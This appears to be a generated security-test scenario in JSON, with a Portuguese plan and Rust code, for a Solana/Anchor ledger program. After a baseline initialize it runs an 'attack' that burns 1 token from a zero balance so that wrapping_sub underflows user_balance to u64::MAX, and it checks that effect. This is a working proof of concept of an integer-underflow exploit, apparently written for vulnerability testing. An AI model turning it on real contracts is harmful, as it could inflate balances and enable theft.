{
  "plan": "O cenário inicializa o ledger com initial_supply = 1000 e user_balance = 0 via a instrução initialize (baseline). Em seguida, o ataque chama burn com amount = 1, que é maior que o user_balance atual (0), explorando o wrapping_sub. O efeito medido é que o user_balance resultante é u64::MAX (underflow), um valor que o uso legítimo (burn com amount <= user_balance) nunca produziria.",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger ainda não inicializada
let ledger_account = empty_account();

// Conta authority com lamports para pagar a criação
let authority_account = wallet(1_000_000_000);

// System program
let (system_program_id, system_program_account) = system_program_account();

// Contas para initialize
let contas_init = vec![
    (ledger_key, ledger_account.clone()),
    (authority, authority_account.clone()),
    (system_program_id, system_program_account.clone()),
];

// Metas para initialize
let metas_init = vec![
    AccountMeta::new(ledger_key, true),
    AccountMeta::new(authority, true),
    AccountMeta::new_readonly(system_program_id, false),
];

// Instrução initialize com initial_supply = 1000
let ix_init = env.anchor_ix("initialize", &(1000u64,), metas_init);

// Baseline: initialize deve ter sucesso
let r_init = env.baseline("initialize ledger", &ix_init, &contas_init);

// Extrair a conta ledger resultante do baseline
let ledger_after_init = r_init.resulting_accounts.iter()
    .find(|(k, _)| *k == ledger_key)
    .map(|(_, acc)| acc.clone())
    .unwrap_or_else(|| ledger_account.clone());

// Contas para burn
let contas_burn = vec![
    (ledger_key, ledger_after_init),
    (authority, authority_account),
];

// Metas para burn
let metas_burn = vec![
    AccountMeta::new(ledger_key, false),
    AccountMeta::new_readonly(authority, true),
];

// Ataque: burn com amount = 1 (maior que user_balance = 0)
let ix_attack = env.anchor_ix("burn", &(1u64,), metas_burn);
let r_attack = env.attack("burn com amount > user_balance", &ix_attack, &contas_burn);

// Efeito: se o ataque teve sucesso, o user_balance deve ter dado a volta para u64::MAX
if r_attack.program_result == ProgramResult::Success {
    let ledger_after_attack = after(&r_attack, &ledger_key);
    let user_balance = read_u64(ledger_after_attack.data(), 40); // offset: 8 (disc) + 32 (authority) = 40
    env.effect("user_balance sofreu underflow (u64::MAX)", user_balance == u64::MAX);
}"
}

